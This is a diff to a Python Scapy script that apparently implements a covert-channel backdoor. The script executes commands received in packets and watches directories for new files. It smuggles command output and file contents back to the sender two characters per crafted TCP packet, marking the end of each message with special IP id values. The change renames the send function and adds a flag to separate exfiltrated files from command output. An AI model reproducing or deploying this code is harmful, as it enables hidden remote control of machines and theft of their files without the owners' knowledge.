@@ -28,7 +28,7 @@ class NewFileHandler(FileSystemEventHandler):
 		global MONITOR
 		filename = os.path.basename(event.src_path)
 		f_binary = file_to_binary(filename, event.src_path)
-		send_msg(f_binary, self.packet[1].src)
+		send_data(f_binary, self.packet[1].src, "write")
 		MONITOR = 1
 
 
@@ -75,20 +75,24 @@ def data_packet(dest, val1, val2=None):
 	return IP(dst=dest) / TCP(sport=80, dport=destport)
 
 
-def end_msg(dest):
+def end_msg(dest, output_type):
 	randPort = randint(1500, 65535)
-	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=80)
+	if(output_type == "print"):
+		type_id = 42424
+	elif(output_type == "write"):
+		type_id = 41414
+	packet = IP(dst=dest, id=type_id) / TCP(dport=randPort, sport=80)
 	send(packet)
 
 
-def send_msg(msg, ip):
+def send_data(msg, ip, output_type):
 	for char1, char2 in zip(msg[0::2], msg[1::2]):
 		# delay_sleep()
 		send(data_packet(ip, char1, char2))
 	if(len(msg) % 2):
 		# delay_sleep()
 		send(data_packet(ip, msg[-1]))
-	end_msg(ip)
+	end_msg(ip, output_type)
 
 
 def run_cmd(packet, cmd):
@@ -112,7 +116,7 @@ def run_cmd(packet, cmd):
 		output.append(err)
 	# output = encrypt_val("".join(output))
 	time.sleep(0.1)
-	send_msg(''.join(output), packet[1].src)
+	send_data(''.join(output), packet[1].src, "print")
 
 
 def watch_dir(packet, path):
